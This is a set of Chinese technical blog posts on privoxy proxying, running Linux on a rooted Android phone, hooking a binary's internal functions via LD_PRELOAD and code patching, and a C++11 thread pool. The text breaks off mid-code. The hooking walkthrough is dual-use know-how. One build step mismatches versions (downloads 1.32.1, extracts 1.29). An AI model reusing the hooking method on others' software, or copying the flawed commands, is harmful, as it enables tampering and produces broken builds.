<p><strong>配置</strong></p>
<ul>
<li>编辑<code>/etc/privoxy/config</code>，新增配置</li>
<li>想配置端口自己搜，默认8118</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">forward-socks5   /               127.0.0.1:1080 .</span><br></pre></td></tr></table></figure>

<ul>
<li>改完重启服务<code>sudo service privoxy restart</code></li>
</ul>
<p><strong>使用</strong></p>
<ul>
<li>直接在需要修改代理的地方加上<code>http://127.0.0.1:8118</code>即可</li>
<li>命令行配置</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;127.0.0.1:8118&quot;</span><br><span class="line">export https_proxy=&quot;127.0.0.1:8118&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux deploy搭建笔记</title>
    <url>/blogs/2021-02-26-linuxDeploy/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>linux deploy是在android手机上使用chroot搭建的linux环境，可以在手机上跑linux系统。<br>现在手机更新换代快。不用的android手机里面可是有高性能cpu和gpu，不用起来太浪费了。<br>但是不想学java，会用linux，那就在android手机上安装linux系统吧。</p>
<h1 id="二、安装配置"><a href="#二、安装配置" class="headerlink" title="二、安装配置"></a>二、安装配置</h1><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h2><ul>
<li>手机要root</li>
<li>网络要好</li>
<li>安装apk: <code>linux deploy</code>、<code>busybox</code></li>
</ul>
<h2 id="2-镜像站列表"><a href="#2-镜像站列表" class="headerlink" title="2. 镜像站列表"></a>2. <span id="source_url">镜像站列表</span></h2><ul>
<li>ubuntu: <code>http://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports</code></li>
<li>arch linux: <code>http://mirrors.tuna.tsinghua.edu.cn/archlinuxarm</code></li>
</ul>
<h2 id="3-安装"><a href="#3-安装" class="headerlink" title="3. 安装"></a>3. 安装</h2><h3 id="3-1-busybox安装"><a href="#3-1-busybox安装" class="headerlink" title="3.1. busybox安装"></a>3.1. busybox安装</h3><ul>
<li>要获取root权限</li>
<li>小米或其他手机可能将<code>/system</code>分区锁定了，需要先解锁</li>
<li>默认安装位置<code>/system/xbin</code>，建议换到<code>/data/busybox/xbin</code>目录下，自己使用adb新建这个目录再安装</li>
<li>解锁并有root权限安装会很顺利</li>
<li>安装完成记得留意cpu架构，后面有用</li>
</ul>
<h3 id="3-2-linux-deploy配置"><a href="#3-2-linux-deploy配置" class="headerlink" title="3.2. linux deploy配置"></a>3.2. linux deploy配置</h3><p><strong>全局配置</strong></p>
<p>左上角三道横线，选设置。这里面的配置项要改</p>
<ol>
<li>屏幕常亮勾选<ul>
<li>大部分手机可能锁屏会自动休眠降低功耗，会导致linux运行很慢</li>
<li>看情况勾选</li>
</ul>
</li>
<li>锁定wifi和cpu唤醒勾选</li>
<li>PATH变量，设置为<code>/data/busybox/xbin</code>，设置完要点击更新环境将path应用</li>
<li>其他看着配置就可以了</li>
</ol>
<p><strong>针对linux的配置</strong></p>
<p>左上角三道横线，选配置文件。针对自己要装的系统新建配置文件，需要手动选中<br>可以用默认的，就怕你反悔，老的配置再配一次。选好后右下角配置按钮进行下面配置</p>
<ol>
<li>发行版和版本自己选择</li>
<li>架构<ul>
<li>android手机一般都是arm64架构的</li>
<li>arm64包含armhf</li>
<li>aarch64和arm64可以混用</li>
<li>armv8是arm64，armv7是32位</li>
<li>busybox里面会显示cpu架构，可以参考</li>
</ul>
</li>
<li>源最好用国内源，不然下载很慢，<a href="#source_url">上面</a>我列了几个</li>
<li>安装类型<ul>
<li>镜像是将所有撞到一个文件里面，需要预设大小，默认2G，一般linux用不到2G，但是自己的文件放进去就不够了</li>
<li>目录是将linux安装到磁盘上</li>
<li><code>/sdcard</code>好像没有执行权限，反正我是失败了</li>
<li><code>/data</code>目录用的也是手机内置储存的空间，和sdcard同样大小，里面放的都是应用的内置数据，不给用户操作，这里很适合放</li>
<li><code>/</code>根目录用的好像是rom，很小，也就2G左右，最好不要放到根目录</li>
<li>我设置为<code>/data/ubuntu</code></li>
</ul>
</li>
<li>用户名，自己看着设置，root自动就有，也可以不要其他用户只要root<ul>
<li>特权用户不要动，<code>aid_inet</code>是给用户访问网络权限的用户组，删掉会无法访问外网</li>
<li>其他特权用户自己摸索，我也不清楚</li>
</ul>
</li>
<li>密码自己看着办</li>
<li>本地化，选<code>zh_CN.UTF-8</code>，或者自己想要的</li>
<li>初始化，配置linux启动时是否要启动服务或执行脚本<ul>
<li><code>run-parts</code>是将<code>/etc/rc.local/</code>下的所有脚本依次执行</li>
<li><code>sysv</code>是根据启动级别执行相应的<code>/etc/rc(x).c/</code>下的脚本，一般软件类似nginx会注册一个到这里面</li>
</ul>
</li>
<li>挂载，将目录挂载到系统中<ul>
<li>source和target都要设置</li>
<li>挂载组是<code>aid_everybody</code>，如果想要访问需要自己将用户添加到这个组里面</li>
</ul>
</li>
<li>ssh启用会帮你安装sshd，最好启用</li>
<li>图形化看情况，反正性能没那么高</li>
</ol>
<h3 id="3-3-安装"><a href="#3-3-安装" class="headerlink" title="3.3. 安装"></a>3.3. 安装</h3><ol>
<li>右上角三个点，安装<ul>
<li>安装网络一定要好，不然失败重新来</li>
</ul>
</li>
<li>如果改了配置，点配置就好了</li>
<li>启动后，电脑或手机找个ssh客户端连接即可</li>
</ol>
<h1 id="三、archlinux在手机的安装"><a href="#三、archlinux在手机的安装" class="headerlink" title="三、archlinux在手机的安装"></a>三、archlinux在手机的安装</h1><h2 id="1-软件配置"><a href="#1-软件配置" class="headerlink" title="1. 软件配置"></a>1. 软件配置</h2><h3 id="1-1-mysql安装配置"><a href="#1-1-mysql安装配置" class="headerlink" title="1.1. mysql安装配置"></a>1.1. mysql安装配置</h3><ul>
<li>需要安装mariadb包，这个是arch官方的mysql社区包</li>
<li>装好后需要执行<code>sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql</code>进行初始化</li>
<li>启动MySQL <code>sudo /usr/bin/mysqld_safe --datadir=&#39;/var/lib/mysql&#39; &amp;</code></li>
<li>进行安全配置 <code>sudo mysql_secure_installation</code></li>
</ul>
<h3 id="1-2-aur软件助手"><a href="#1-2-aur软件助手" class="headerlink" title="1.2. aur软件助手"></a>1.2. aur软件助手</h3><ul>
<li>arm上使用yay无法直接通过pacman进行安装</li>
<li>使用下面命令进行安装</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /path/to/dir</span><br><span class="line">git clone https://aur.archlinux.org/yay-git.git</span><br><span class="line">cd yay-git</span><br><span class="line">makepkg -si</span><br></pre></td></tr></table></figure>

<p><strong>报错fakeroot错误</strong></p>
<p>参考这篇博客<a href="https://zsxwz.com/2021/02/08/%e8%a7%a3%e5%86%b3chroot-proot-wsl%e5%ae%b9%e5%99%a8%e5%ae%89%e8%a3%85archlinux%e4%b8%8d%e8%83%bd%e4%bd%bf%e7%94%a8fakeroot%e7%9a%84%e9%97%ae%e9%a2%98/">解决chroot&#x2F;proot&#x2F;wsl容器安装archlinux不能使用fakeroot的问题</a></p>
<h3 id="1-3-fakeroot"><a href="#1-3-fakeroot" class="headerlink" title="1.3. fakeroot"></a>1.3. fakeroot</h3><ul>
<li>原始的fakeroot不能使用yay，参考上面的链接，安装</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖</span></span><br><span class="line">sudo pacman -S po4a automake autoconf --overwrite &quot;*&quot; --needed</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">老的可能不是pacman装的，新装一个覆盖一下</span></span><br><span class="line">sudo pacman -S fakeroot --overwrite &quot;*&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后再卸掉</span></span><br><span class="line">sudo pacman -Rnsuc fakeroot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装一个debian版本的，这个是为了让fakeroot-tcp能编译通过</span></span><br><span class="line">wget http://ftp.debian.org/debian/pool/main/f/fakeroot/fakeroot_1.32.1.orig.tar.gz</span><br><span class="line">tar -xzvf fakeroot_1.29.orig.tar.gz</span><br><span class="line">cd fakeroot_1.29</span><br><span class="line">./bootstrap</span><br><span class="line">./configure --prefix=/opt/fakeroot --libdir=/opt/fakeroot/libs --disable-static --with-ipc=tcp</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建软链接</span></span><br><span class="line">ln -s /opt/fakeroot/bin/fakeroot /usr/bin/</span><br><span class="line">ln -s /opt/fakeroot/bin/faked /usr/bin/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装fakeroot-tcp</span></span><br><span class="line">cd ..</span><br><span class="line">git clone https://aur.archlinux.org/fakeroot-tcp.git</span><br><span class="line">cd fakeroot-tcp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装，应该是安装不上去的，但是生成了离线安装包。</span></span><br><span class="line">makepkg</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除之前编译的fakeroot</span></span><br><span class="line">sudo rm -rf /opt/fakeroot</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">覆盖安装，离线安装包</span></span><br><span class="line">sudo pacman -U --overwrite &quot;*&quot; fakeroot*.pkg.tar.xz</span><br></pre></td></tr></table></figure>

<h1 id="四、软件使用"><a href="#四、软件使用" class="headerlink" title="四、软件使用"></a>四、软件使用</h1><h2 id="1-nginx"><a href="#1-nginx" class="headerlink" title="1. nginx"></a>1. nginx</h2><ul>
<li>由于底层使用的是chroot实现，无法使用system命令</li>
<li>启动nginx不需要使用system命令</li>
</ul>
<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-adb调试本机"><a href="#1-adb调试本机" class="headerlink" title="1. adb调试本机"></a>1. adb调试本机</h2><ul>
<li>安装的是linux系统，自然可以安装adb，但是adb监听的端口和android自带的adbd监听端口冲突了，所以需要修改端口</li>
<li>保证adb没有启动，然后执行下面命令修改端口，然后可以愉快的使用adb了</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export ANDROID_ADB_SERVER_PORT=9999</span><br></pre></td></tr></table></figure>

<ul>
<li>手机开启adb网络调试</li>
<li>如果adb启动前开启网络调试，adb启动后可以直接看到设备</li>
<li>如果adb启动后开启网络调试，可以使用<code>adb connect 127.0.0.1:5555</code>连接本机</li>
</ul>
<h2 id="2-arm64架构安装opencv-python"><a href="#2-arm64架构安装opencv-python" class="headerlink" title="2. arm64架构安装opencv_python"></a>2. arm64架构安装<code>opencv_python</code></h2><h3 id="2-1-先装opencv，再装opencv-python"><a href="#2-1-先装opencv，再装opencv-python" class="headerlink" title="2.1. 先装opencv，再装opencv_python"></a>2.1. 先装opencv，再装<code>opencv_python</code></h3><ul>
<li>arch下面配置编译安装<code>opencv_python</code>步骤太繁琐了，没配好</li>
<li>直接<code>sudo pacman -Sy opencv</code>然后<code>pip install opencv_python</code>完事</li>
<li>apt包就是<code>sudo apt install libopencv-dev</code>然后<code>pip install opencv_python</code>完事</li>
</ul>
<h3 id="2-2-编译安装"><a href="#2-2-编译安装" class="headerlink" title="2.2. 编译安装"></a>2.2. 编译安装</h3><ul>
<li>默认的pip安装<code>opencv_python</code>包会报错，无法识别架构之类的，默认的安装只支持<code>x86_64/amd64</code></li>
<li>想要使用opencv，需要使用源码编译</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">clone</span> opencv代码</span></span><br><span class="line">git clone https://github.com/opencv/opencv.git</span><br><span class="line">git clone https://github.com/opencv/opencv_contrib.git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">到opencv目录进行编译</span></span><br><span class="line">mkdir opencv/build</span><br><span class="line">cd opencv/build</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用cmake进行配置，注意修改里面的每个路径的值到真实的路径</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cmake过程报的错自己解决</span></span><br><span class="line">cmake -D BUILD_opencv_python3=YES -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/home/wangyubo/miniforge3/opencv4.5.2 -D OPENCV_EXTRA_MODULES=../../opencv_contrib/modules -D PYTHON3_LIBRARIES=/home/wangyubo/miniforge3/lib/libpython3.9.so -D PYTHON3_EXECUTABLE=/home/wangyubo/miniforge3/bin/python -D PYTHON3_NUMPY_INCLUDE_DIRS=/home/wangyubo/miniforge3/lib/python3.9/site-packages/numpy/core/include/ -D PYTHON3_PACKAGES_PATH=/home/wangyubo/miniforge3/lib/python3.9/site-packages ..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译安装</span></span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<h2 id="3-armv8l和conda"><a href="#3-armv8l和conda" class="headerlink" title="3. armv8l和conda"></a>3. armv8l和conda</h2><ul>
<li>miniforge和archiforge都识别不出来armv8l，会认为是<code>x86_64</code>安装的python无法使用</li>
<li>暂时没有解决方案，armv8l先不要用conda吧</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制行内hook方案（C/C++)</title>
    <url>/blogs/2021-01-03-inlineHook/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>正常hook方案都是大家熟知的使用<code>LD_PRELOAD=xxx.so</code>，将其中的某个动态库的函数整个声明全部覆盖掉，利用比其so库先加载的特权将此函数覆盖掉。<br>但是此方法只能对于动态库的函数生效，如果一个函数是二进制内部实现的函数，此方法就无效了。<br>本文讨论如何hook二进制内部函数，并且实现回调。</p>
<h1 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h1><h2 id="1-基础知识补充"><a href="#1-基础知识补充" class="headerlink" title="1. 基础知识补充"></a>1. 基础知识补充</h2><h3 id="1-1-二进制符号"><a href="#1-1-二进制符号" class="headerlink" title="1.1. 二进制符号"></a>1.1. 二进制符号</h3><p><a href="/blogs/2018-09-18-CStudy/#2-%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%AC%A6%E5%8F%B7">二进制符号</a></p>
<h2 id="2-困难点"><a href="#2-困难点" class="headerlink" title="2. 困难点"></a>2. 困难点</h2><ol>
<li>由于二进制符号都会调用本地的函数，使用<code>LD_PRELOAD</code>并不能控制二进制调用函数的地址</li>
<li>如何查找二进制的本地函数地址</li>
<li>汇编代码如何插入</li>
<li>如何调用回原函数</li>
</ol>
<h2 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h2><h3 id="1-无法直接控制二进制调用函数地址"><a href="#1-无法直接控制二进制调用函数地址" class="headerlink" title="1) 无法直接控制二进制调用函数地址"></a>1) 无法直接控制二进制调用函数地址</h3><ul>
<li>无法通过正常手段进行控制，就使用更加底层的汇编进行实现</li>
<li>在函数的进入位置插入汇编代码，跳转到自己的函数地址，实现调用</li>
</ul>
<h3 id="2-如何查找二进制的本地函数地址"><a href="#2-如何查找二进制的本地函数地址" class="headerlink" title="2) 如何查找二进制的本地函数地址"></a>2) 如何查找二进制的本地函数地址</h3><ul>
<li>这一步比较简单，直接<code>readelf -Ws xxx | grep [func_name]</code>就可以找到函数的地址</li>
</ul>
<h3 id="3-汇编代码如何插入"><a href="#3-汇编代码如何插入" class="headerlink" title="3) 汇编代码如何插入"></a>3) 汇编代码如何插入</h3><ul>
<li>程序段是无法写的，数据段才可以写</li>
<li>程序告诉你不能写，程序解决，直接改成可写</li>
<li>插入跳转到新的函数地址</li>
<li>插入这一步，需要先进行<code>LD_PRELOAD</code>hook一个进入函数，然后才能在里面进行初始化修改汇编代码</li>
</ul>
<h3 id="4-如何调用原函数"><a href="#4-如何调用原函数" class="headerlink" title="4) 如何调用原函数"></a>4) 如何调用原函数</h3><ul>
<li>由于插入了汇编代码，把之前的汇编代码破坏了，咋调回去</li>
<li>不破坏，先拷贝一份到新内存地址，然后调用原函数时跳转到新内存地址</li>
<li>新内存地址的最后，跳转到原来的地址的剩余部分</li>
</ul>
<h1 id="三、实现"><a href="#三、实现" class="headerlink" title="三、实现"></a>三、实现</h1><h2 id="1-插入汇编代码，支持调用原函数"><a href="#1-插入汇编代码，支持调用原函数" class="headerlink" title="1. 插入汇编代码，支持调用原函数"></a>1. 插入汇编代码，支持调用原函数</h2><ul>
<li>emmmm，这种事情不能自己做是吧（其实是不会），找开源代码实现 <a href="https://github.com/Zeex/subhook">subhook</a></li>
</ul>
<img src="2022-03-28-01.png" />

<h2 id="2-问题1-部分函数hook失败"><a href="#2-问题1-部分函数hook失败" class="headerlink" title="2. 问题1 部分函数hook失败"></a>2. 问题1 部分函数hook失败</h2><ul>
<li>怎么说呢，毕竟用的是第三方的库，作者好像是自己实现的汇编解析器</li>
<li>需要解析每一个汇编指令的长度，并不是所有的汇编指令长度都是固定的</li>
<li>根据测试，这个库的汇编指令解析精确度只有不到30%，如果自己的函数测试可以用还是可控的</li>
<li>害怕出现问题，就对着汇编指令手册，将作者的代码优化一边就好了</li>
</ul>
<h2 id="2-问题2-函数地址是不固定的"><a href="#2-问题2-函数地址是不固定的" class="headerlink" title="2. 问题2 函数地址是不固定的"></a>2. 问题2 函数地址是不固定的</h2><ul>
<li>高版本内核里面的函数地址是每次启动都会随机</li>
<li>可是这是linux，存在一个神奇的<code>/proc/self/maps</code>文件</li>
<li>根据测试，文件第一行的第一个地址是程序的基地址</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xxx.so::xxx.c</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testFunc</span><span class="params">(<span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 打开maps文件读取进程基地址</span></span><br><span class="line">    <span class="keyword">auto</span> file_handle = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;%s open failed, err %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">65</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">fread</span>(buf, <span class="number">1</span>, <span class="number">64</span>, file_handle);</span><br><span class="line">    <span class="built_in">fclose</span>(file_handle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 截取第一个-，前面的为基地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buf[i] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            buf[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LOG_HEX</span>(buf, <span class="number">64</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mem_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%llx&quot;</span>, &amp;mem_addr);</span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;mem_addr %llx&quot;</span>, mem_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拿到基地址，加上函数的偏移量，得到和二进制中打印的一样的函数地址</span></span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;get_svpn_rand addr %llx&quot;</span>, mem_addr + <span class="number">0x43e2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>线程池讲解（C++）</title>
    <url>/blogs/2020-08-01-threadPool/</url>
    <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>线程池是一般服务端或者客户端编程经常要用到的一种管理线程的类，从网上找到一个比较好的线程池实现，主要运用C++11。记录一下理解过程，帮助学习线程池和C++11。</p>
<h1 id="2-代码"><a href="#2-代码" class="headerlink" title="2. 代码"></a>2. 代码</h1><h2 id="2-1-先上代码"><a href="#2-1-先上代码" class="headerlink" title="2.1 先上代码"></a>2.1 先上代码</h2><p>threadPool.hpp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author WangYubo</span></span><br><span class="line"><span class="comment"> * @Date 09/17/2018</span></span><br><span class="line"><span class="comment"> * @Description 线程池实现的头文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> THREAD_POOL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_POOL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;condition_variable&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;future&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">threadPool</span> &#123;</span><br><span class="line">    <span class="keyword">using</span> Task = std::function&lt;<span class="built_in">void</span>(<span class="type">void</span>)&gt;;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">    std::vector&lt;std::thread&gt; m_pool;   <span class="comment">//线程池</span></span><br><span class="line">    std::atomic&lt;<span class="type">int</span>&gt; m_idleThreadNum;  <span class="comment">//空闲线程数量</span></span><br><span class="line">    std::atomic&lt;<span class="type">bool</span>&gt; m_stoped;        <span class="comment">//是否停止线程</span></span><br><span class="line">    std::mutex m_lock;                 <span class="comment">//线程池锁</span></span><br><span class="line">    std::queue&lt;Task&gt; m_tasks;          <span class="comment">//待执行任务</span></span><br><span class="line">    std::condition_variable m_cv;      <span class="comment">//线程控制</span></span><br><span class="line">    <span class="type">int</span> m_threadNum = <span class="number">0</span>;               <span class="comment">//线程总数</span></span><br><span class="line">    std::string m_poolName;            <span class="comment">//线程池名称</span></span><br><span class="line">    <span class="comment">//线程执行函数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">threadPool</span>() : <span class="built_in">m_stoped</span>(<span class="literal">true</span>) &#123;&#125;</span><br><span class="line">    ~<span class="built_in">threadPool</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加线程函数</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">F</span>, <span class="keyword">class</span>... Args&gt;</span><br><span class="line">    <span class="function"><span class="keyword">auto</span> <span class="title">commit</span><span class="params">(F &amp;&amp;f, Args &amp;&amp;... args)</span> -&gt; std::future&lt;<span class="title">decltype</span><span class="params">(f(args...))</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">using</span> RetType = <span class="keyword">decltype</span>(<span class="built_in">f</span>(args...));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (m_stoped) &#123;</span><br><span class="line">            <span class="keyword">return</span> std::<span class="built_in">future</span>&lt;RetType&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> task = std::make_shared&lt;std::packaged_task&lt;<span class="built_in">RetType</span>()&gt;&gt;(</span><br><span class="line">            std::<span class="built_in">bind</span>(std::forward&lt;F&gt;(f), std::forward&lt;Args&gt;(args)...));</span><br><span class="line">        <span class="keyword">auto</span> ret = task-&gt;<span class="built_in">get_future</span>();</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(m_lock)</span></span>;</span><br><span class="line">            m_tasks.<span class="built_in">emplace</span>([task] &#123; (*task)(); &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        m_cv.<span class="built_in">notify_one</span>();</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> threadNum, std::string name = <span class="string">&quot;ThreadPool&quot;</span>)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>threadPool.cpp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author WangYubo</span></span><br><span class="line"><span class="comment"> * @Date 09/17/2018</span></span><br><span class="line"><span class="comment"> * @Description 线程池实现的cpp文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;threadPool.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">threadPool::~<span class="built_in">threadPool</span>() &#123;</span><br><span class="line">    m_stoped = <span class="literal">true</span>;</span><br><span class="line">    m_cv.<span class="built_in">notify_all</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;tmp : m_pool) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="built_in">joinable</span>()) tmp.<span class="built_in">join</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">threadPool::init</span><span class="params">(<span class="type">int</span> threadNum, string name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!m_stoped) &#123;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;%s has been started, thread num %d&quot;</span>, m_poolName.<span class="built_in">c_str</span>(),</span><br><span class="line">                 m_threadNum);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">unique_lock&lt;mutex&gt; <span class="title">lock</span><span class="params">(m_lock)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (!m_stoped) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m_stoped = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 清理旧的线程，初始化新的线程</span></span><br><span class="line">        m_pool.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; threadNum; i++) &#123;</span><br><span class="line">            m_pool.<span class="built_in">emplace_back</span>(<span class="built_in">thread</span>(&amp;threadPool::run, <span class="keyword">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        m_threadNum = threadNum;</span><br><span class="line">        m_poolName = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;%s start thread num %d&quot;</span>, m_poolName.<span class="built_in">c_str</span>(), m_threadNum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">threadPool::run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        m_idleThreadNum--;</span><br><span class="line">        Task task;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function">unique_lock&lt;mutex&gt; <span class="title">lock</span><span class="params">(m_lock)</span></span>;</span><br><span class="line">            m_cv.<span class="built_in">wait</span>(lock, [<span class="keyword">this</span>] &#123; <span class="keyword">return</span> m_stoped || !(m_tasks.<span class="built_in">empty</span>()); &#125;);</span><br><span class="line">            <span class="keyword">if</span> (m_tasks.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                <span 